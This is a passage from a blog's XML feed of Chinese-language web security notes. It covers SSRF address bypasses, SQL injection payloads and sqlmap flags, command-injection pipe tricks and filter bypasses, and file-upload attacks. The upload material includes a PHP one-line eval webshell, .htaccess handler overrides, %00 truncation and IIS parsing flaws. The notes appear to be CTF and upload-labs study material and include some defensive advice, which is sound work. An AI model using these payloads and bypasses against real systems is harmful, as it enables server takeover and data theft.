href="http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/%E7%9F%AD%E5%9C%B0%E5%9D%80http://dwz.cn/11SMa==&gt;http://127.0.0.1%E5%88%A9%E7%94%A8%E5%8F%A5%E5%8F%B7%E3%80%82%EF%BC%9A127%E3%80%820%E3%80%820%E3%80%821==&gt;127.0.0.1%E5%88%A9%E7%94%A8">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/短地址http://dwz.cn/11SMa==&gt;http://127.0.0.1利用句号。：127。0。0。1==&gt;127.0.0.1利用</a> Enclosed alphanumerics</p></li></ol><h2 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h2><ol><li>开启OpenSSL无法进行交互利用服务端需要鉴权不能完美利用限制请求的端口为http常用端口，比如，80,443,8080,8090.</li><li>禁用不需要的协议。</li><li>仅仅允许http和https请求。可以防止类似于 file://,gopher://,ftp:// 等引起的问题。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2021/08/22/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/22/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>原理</strong>：所谓sql注入就是通过把sql命令插入到web表单提交或输入域名或页面请求的拆线呢字符串，最终达到欺骗服务器执行指定的sql语句。具体来说，它是利用现有的应用程序，将sql语句注入到后台数据库引擎执行的能力，它可以通过在Web表单上输入sql语句得到一个存在的安全漏洞的网站上的数据，而不是按照设计者意图在执行sql语句</p><p>一、 sql注入漏洞的原理：sql注入攻击指的是通过构建特殊的输入作为参数传入web应用程序，而这些输入大都是sql语法里的一些组合，通过执行sql语句进而执行攻击者所要的操作，其主要原因就是程序根据相关技术原理，sql注入可以分为平台层注入和代码层注入。前者由于不安全的数据库配置或者数据库平台的漏洞所致；后者主要是由于程序员对输入未进行戏指地过滤，从而执行了非法的数据查询。基于此，sql注入的产生原因通常表现在以下几方面：</p><ol><li>不合理的查询集处理</li><li>不当的错误处理</li><li>转义字符处理不合适</li><li>多个提交处理不当</li></ol><p>二、sql注入漏洞的方法</p><ol><li>数字注入：</li></ol><p>在浏览器地址中输入：?id=1，这是一个get型的接口，发送这个请求相当于调用一个查询语句：</p><p><code>select * from arrticle where id =&quot;$id&quot;</code></p><p>正常情况下，应该返回一个id=1的文章。那么，如果在浏览器地址栏中输入?id=-1or1=1，这就是一个sql注入攻击了，可能会返回所有文章的信息。</p><p>这是因为，id=-1永远为false，而1=1永远是true，根据or语句，那么where的语句的条件想到与没有，那么查询的结果相当于整张表格的内容。</p><p>2.字符串注入</p><p>有这样一个用户登陆的场景:登陆界面包括用户名和密码输入框，以及提交按钮。输入用户名和密码，提交。</p><p>这是一个post的请求，登陆时调用接口learn.me/sql/login.html,首先连接数据库，然后在后台请求用户名和密码参数校验，即是一个sql的查询过程。假设正确的用户名和密码user和pwd123，输入正确的用户名和密码、提交。相当于调用了以下的sql语句。</p><p><code>SELECT *FROM user HERE username =&#39;user&#39; AND password =&#39;pwd123&#39;</code></p><p>由于用户名和密码都是字符串，sql注入方法既是参数携带的数据编程mysql中注释的字符串。mysql中有2种注释的方法</p><ul><li>‘#’：在这之后的所有字符串都会呗当成注释处理，用户名输入user’#密码任意输入，这样提交相当于</li></ul><p><code>SELECT * FROM suer WHERE username=&#39;username&#39;#&#39; AND password=&#39;&#39;</code></p><p>后面相当于注释掉了。</p><ol start="2"><li>‘__’后面的字符串也会被当成注释来处理</li></ol><h2 id="当我们遇到sql题目的时候的处理方法"><a href="#当我们遇到sql题目的时候的处理方法" class="headerlink" title="当我们遇到sql题目的时候的处理方法"></a>当我们遇到sql题目的时候的处理方法</h2><ol><li>首先先输入<code>‘ </code>进行判断是否有注入点，也可and 1=1 and 1=2   </li><li>爆破当前的数据库名：通常先用order by使用order by 语法，确定字段数。这个语句的意思是按照第n列排序，若order by 8正常，order by 9报错的话就表示原查询语句查询结果为9列。</li></ol><p><code>union select 1,2,database()#</code></p><ol start="3"><li>按照要求爆破出自己需要的</li></ol><p><img src="https://images2018.cnblogs.com/blog/1371400/201804/1371400-20180418233926050-609985087.png" alt="img"></p><p>上面为手动注入，下面可以使用工具，sqlmap</p><p>sqlmap主要是语法之间的使用</p><p>对于文件来说 -r 读取文件 -p 确定参数 –current-db 爆破出当前数据库</p><p>常见的 -u 检测是否有注入点</p><p>-d 数据库</p><p>-t 表</p><p>-c 列</p><p>–dump 爆破数据</p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2021/08/22/RCE/"/>
      <url>/2021/08/22/RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="RCE远程代码-命令执行"><a href="#RCE远程代码-命令执行" class="headerlink" title="RCE远程代码/命令执行"></a>RCE远程代码/命令执行</h2><h2 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><h2 id="RCE漏洞产生的原因"><a href="#RCE漏洞产生的原因" class="headerlink" title="RCE漏洞产生的原因"></a>RCE漏洞产生的原因</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并且返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台执行，从而控制整个后台服务器。</p><p><strong>具体的后端代码</strong></p><p><code>$result . =shell_exec(&#39;ping &#39; .$ip);</code>//直接将变量拼接进来，没做处理</p><p><code>if(@!eval($_POST[&#39;txt&#39;]))</code>//远程代码执行evel。</p><p>这里和上面执行ping指令不同的时，这里是php代码，而上面执行的是命令行。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>Windows管道符</p><table><thead><tr><th>管理符</th><th>作用</th><th>举例</th></tr></thead><tbody><tr><td>|</td><td>直接执行后面的语句</td><td>ping 127.0.0.1|whoami</td></tr><tr><td>||</td><td>前面的语句执行出错则执行后面的语句</td><td>ping 127.0.0.1||whoami</td></tr><tr><td>&amp;</td><td>前面的语句为假则执行后面的语句</td><td>ping 127.0.0.1&amp;whoami</td></tr><tr><td>&amp;&amp;</td><td>前面的语句为假，直接出错，前面的语句为真，执行后面的语句</td><td>ping 127.0.0.1&amp;&amp;whoami</td></tr><tr><td>；</td><td>先执前面的语句后执行后面的语句</td><td>ping 127.0.0.1;whoami</td></tr></tbody></table><p>一般我们是需要用后面的语句来进行攻击，所以首选|。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>尽量不要使用命令执行函数</p><p>不要让用户控制参数</p><p>执行前做好检测和过滤</p><h2 id="PHP命令执行函数"><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2><ol><li>system():</li></ol><p>system 执行外部程序（命令行），并且显示输出</p><p>这个函数会将结果直接进行输出（注意：是直接输出区别于返回值），<strong>命令成功后返回输出的最后一行</strong>，失败返回FALSE。</p><ol start="2"><li>shell_exec()：</li></ol><p>shell_exec通过shell环境执行命令（<strong>这就意味着这个方法只能在liunx或mac os的shell环境中使用</strong>），并且完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p><ol start="3"><li>exec():</li></ol><p>exec执行一个外部程序</p><p>返回命令执行结果最后一行的内容。不显示回显。如果想要获取命令的输出内容，请确保使用output参数，或者利用这个函数来构建反弹shell。</p><ol start="4"><li>passthru():</li></ol><p>passthru 执行外部程序并且显示原始输出</p><ol start="5"><li>反引号</li></ol><p>反引号可以用来在php代码中直接执行系统命令，但是想要回显的话还需要一个echo：</p><ol start="6"><li>花括号</li></ol><p>{command，}</p><ol start="7"><li>echo命令</li></ol><h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><p>代码执行漏洞与命令执行漏洞具有相通性。</p><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：</p><p>eval（），assert（），preg_replace()、**${}**等</p><p>${}执行代码（在双引号中倘若有${}出现，那么{}内的内容将被当作php代码块来执行。）</p><h2 id="实战过滤"><a href="#实战过滤" class="headerlink" title="实战过滤"></a>实战过滤</h2><ol><li>遇到运算符过滤绕过</li></ol><p>%0a换行</p><ol start="2"><li>空格及关键词过滤绕过</li></ol><p>${IFS} 关键词中加入$* 绕过</p><ol start="3"><li>cat过滤</li></ol><p>使用双引号进行绕过</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件上传</title>
      <link href="/2021/08/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/08/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h2 id="什么是Webshell"><a href="#什么是Webshell" class="headerlink" title="什么是Webshell"></a>什么是Webshell</h2><p>顾名思义，“webshell”显然是需要服务器开放web服务取得对服务器某种程度上操作权限。</p><p><strong>原理</strong>：webshell就是以asp、php、jsp、或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，秩序上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后面程序使用，以达到控制网站服务器的目的。</p><p><strong>webshell常常被称为匿名用户通过WEB服务端口对WEB服务器有某种程度上操作的权限，由于其大多是以网页脚本的形式出现，也有人称之为网站后门工具。</strong></p><h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><ol><li>webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限（是ASP的一个对文件操作的控件，该控件可以对服务器进行读取、新建、修改、删除目录以及文件的操作）的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序指令。</li><li>被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常被为WEB脚本木马，目前比较流行的asp或php木马，也有基于.NET的脚本木马。</li></ol><h3 id="webshell的隐蔽性"><a href="#webshell的隐蔽性" class="headerlink" title="webshell的隐蔽性"></a>webshell的隐蔽性</h3><p> 有些恶意网页脚本可以嵌套在正常网页中运行，且不容易被查杀。webshell可以穿越服务器防火墙，由于与被控制的服务器或远程主机交换的数据都是通过80端口传递的，因此不会被防火墙拦截。并且使用webshell一般不会在系统日志中留下记录，指挥在网站的web日志留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹。</p><h3 id="如何防范恶意后面？"><a href="#如何防范恶意后面？" class="headerlink" title="如何防范恶意后面？"></a>如何防范恶意后面？</h3><p>从根本上解决动态页面脚本的安全问题，要做到防注入、防爆库、防COOKIES欺骗、防跨站脚本攻击等等，务必配置好服务器FSO权限。</p><h2 id="什么是任意文件上传及其产生原理"><a href="#什么是任意文件上传及其产生原理" class="headerlink" title="什么是任意文件上传及其产生原理"></a>什么是任意文件上传及其产生原理</h2><p>上传漏洞这个顾名思义，就是攻击者通过上传木马文件，直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。漏洞产生原理：由于程序员在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷，而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p><p>简单的来说：</p><p>服务端没有对客户端上传的文件进行严格验证或过滤，用户可以上传一个可执行的脚本文件，并通过此脚本获得了执行服务端命令的能力。</p><h2 id="网站对于文件上传的几种检测方式"><a href="#网站对于文件上传的几种检测方式" class="headerlink" title="网站对于文件上传的几种检测方式"></a>网站对于文件上传的几种检测方式</h2><p> 一、 前端JavaScript检测 前端一般都是使用js来限制我们的上传类型和文件大小，这里以upload-labs Pass为例</p><p>​    <code>function checkFile() &#123;   var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;   if (file == null || file == &quot;&quot;) &#123; ​    alert(&quot;请选择要上传的文件!&quot;); ​    return false;   &#125;   //定义允许上传的文件类型   var allow_ext = &quot;.jpg|.png|.gif&quot;;   //提取上传文件的类型   var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));   //判断上传文件类型是否允许上传   if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; ​    var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; ​    alert(errMsg); ​    return false;   &#125; &#125;</code></p><p>对于前端的检测我们可以通过抓包来修改文件类型，也可以禁用掉JavaScript。总之，只有前端的限制是非常不安全的，非常容易被绕过。</p><p>二、 后端检测文件类型（MIME）</p><ol><li>检测content-type（内容类型）</li></ol><p>后端代码大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_content_type = array(&quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/jpeg&quot;);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];if (!in_array($type, $allow_content_type)) &#123;</span><br><span class="line">    die(&quot;File type error!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&quot;myfile&quot;][&quot;name&quot;];</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过方法：抓包将content-type改为图片形式（即‘image/png’等），即可成功上传</p><ol start="2"><li>检测文件头判断文件类型</li></ol><p>后端代码大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_mime = array(&quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/jpeg&quot;);</span><br><span class="line">$imageinfo = getimagesize($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">if (!in_array($imageinfo[&#x27;mime&#x27;], $allow_mime)) &#123;</span><br><span class="line">    die(&quot;File type error!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&quot;myfile&quot;][&quot;name&quot;];</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时虽然检查的也是文件类型，但是使用<code>getimagesize()</code>函数来获取文件的MIME类型，此时检测的不是数据包中<code>content-type</code>，而是图片的文件头，常见的图片文件头如下：</p><p>  gif(GIF89a) : 47 49 46 38 39 61</p><p>  jpg、jpeg : FF D8 FF</p><p>  png : 89 50 4E 47 0D 0A</p><p>绕过方法：</p><p>当上传php文件时，可以使用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测。</p><p>三、 后端检测文件拓展名</p><ol><li>黑名单检测：</li></ol><p>后端代码大致为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 实际情况中黑名单内数据会更多更全面</span><br><span class="line">&lt;?php</span><br><span class="line">$blacklist = array(&#x27;php&#x27;, &#x27;asp&#x27;, &#x27;aspx&#x27;, &#x27;jsp&#x27;);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$type = array_pop(explode(&#x27;.&#x27;, $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;]));if (in_array(strtolower($type), $blacklist)) &#123;</span><br><span class="line">    die(&quot;File type errer!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">    if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>众所周知使用黑名单是非常不安全的，很多网站会使用拓展名黑名单来限制上传文件类型，甚至在判断时都不用<code>strtolower()</code>来处理，因此造成漏洞</p><p>绕过方法：</p><p>使用一些特殊扩展名来绕过（如php可以使用php3、php4、php5等来代替）</p><p>在后端比较没有转换大小写处理时，使用大小写混淆（如将php改为pHp等）来绕过</p><ol start="2"><li>白名单检测</li></ol><p>大致代码如下，与黑名单没有什么太大的差别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">    file_put_contents($file, $content);</span><br><span class="line">    echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>白名单相当于黑名单就安全许多，要求只能是特定拓展名的文件才能上传，虽然我们无法从代码层面来绕过，但这样也不是绝对的安全，可以利用其他漏洞来绕过。</p><p>绕过方法：</p><ol><li>使用%00截断文件名来上传（后面会讲）</li><li>如果目标还存在文件包含漏洞，那么就可以上传图片码在文件包含来拿shell</li></ol><p>三、后端检测文件内容</p><ol><li>文件内容替换</li></ol><p>这种主要是将文件中的敏感字符替换掉，大致代码类似于下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">    file_put_contents($file, $content);</span><br><span class="line">    echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时如果我们要上传php的一句话<code>&lt;?php@eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的标记语言中的？会被替换为！，这样一句话就不能被执行了</p><p>绕过方法：</p><p>主要还是要根据实际过滤字符来进行判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p><p>比如过滤问好，我们就可以使用<script language="php">system('ls');</script>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p><ol start="2"><li>图片二次渲染</li></ol><p>我们以upload-labs Pass-16的源码为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">$filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">$tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);// 获得上传文件的扩展名</span><br><span class="line">$fileext= substr(strrchr($filename,&quot;.&quot;),1);//判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">//使用上传的图片生成新的图片</span><br><span class="line">$im = imagecreatefromjpeg($target_path);if($im == false)&#123;</span><br><span class="line">$msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">@unlink($target_path);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">//给新图片指定文件名</span><br><span class="line">srand(time());</span><br><span class="line">$newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">imagejpeg($im,$img_path);</span><br><span class="line">@unlink($target_path);</span><br><span class="line">$is_upload = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$msg = &quot;上传出错！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>大致意思是后端调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉。</p><?phpinfo()?><p>四、 %00截断</p><p>这个多数被利用在截断路径，利用的条件是：</p><p>php &lt; 5.3.4</p><p>magic_quotes_gps 关闭</p><p>因为0×00是字符串的结束标志符，所以php在读取到0×00时就不会再往后进行读取，我们可以利用这些截断字符截断后面不需要的内容</p><p>源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">$file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">$is_upload = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$msg = &#x27;上传出错！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">$msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是白名单限制了上传文件类型，因此我们无法在文件名处做文章。但最终<code>move_uploaded_file()</code>的目标目录是我们可控的，我们可以将POST传入的save_path改为../upload/shell.php%00,这样后面的内容就会被截断掉，这就导致了任意文件上传</p><p>还要注意%00是url编码，在以POST为传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而到GET传参时因为浏览器会做一便url decode，所以直接传%00即可</p><p>五、利用.htaccess解析</p><p>  .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>利用.htaccess的条件：Apache中配置AllowOverride All</p><p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p><p>&lt;FilesMatch “test”&gt;<br> SetHandler application/x-httpd-php<br></p><p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p><p>AddType application/x-httpd-php .jpg</p><p>第二种是将.jpg文件都作为php文件解析</p><p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p><p>六、解析漏洞</p><p>IIS解析漏洞</p><p>IIS6.0中有两个很重要的asp解析漏洞：</p><p>假设当前有一个名为<code>“xxx.asp”</code>的目录，那么该目录下的所有文件都会被作为asp文件解析</p><p>假设上传一个名为<code>“test.asp;xxx.jpg”</code>时，该文件就会被当作asp文件解析</p><p>IIS7.5</p><p>这个其实不能算IIS的洞，它其实是php的解析漏洞，这个漏洞利用调节是服务器在php.ini中将cgi.fix_pathinfo的值设置为1</p><p>然后当我们访问服务器上任意一个文件时（如：<a href="http://test.com/a.jpg%EF%BC%89,%E5%BD%93%E6%88%91%E4%BB%AC%E5%9C%A8url%E5%90%8E%E9%9D%A2%E6%B7%BB%E5%8A%A0%60.php%60%EF%BC%88http://test.com/a.jpg/.php%EF%BC%89,%E9%82%A3%E4%B9%88%E6%96%87%E4%BB%B6a.jpg%E5%B0%B1%E5%B0%86%E8%A2%AB%E4%BD%9C%E4%B8%BAphp%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E3%80%82">http://test.com/a.jpg）,当我们在url后面添加`.php`（http://test.com/a.jpg/.php）,那么文件a.jpg就将被作为php文件解析。</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 在测试时，一般我们都先要fuzz看一下检测是哪种类型，是前端还是后端？黑名单还是白名单？上传后的shell能否被成功执行？是否有文件内容的检测？</p><p>如果是黑名单的话，就要尝试各种特殊文件名（php、Php、PHP、pht、php5、phtml），或者在扩展名后添加空格、::$DATA、.等字符，再或者是尝试上传.htaccess</p><p>如果是白名单，就要看是否可以使用%00截断，或者利用服务器的解析漏洞。如果真的过滤很死的话，不妨再找一下目标的文件包含漏洞，尝试利用文件包含来解析图片马。</p>]]></content>
      
      
      
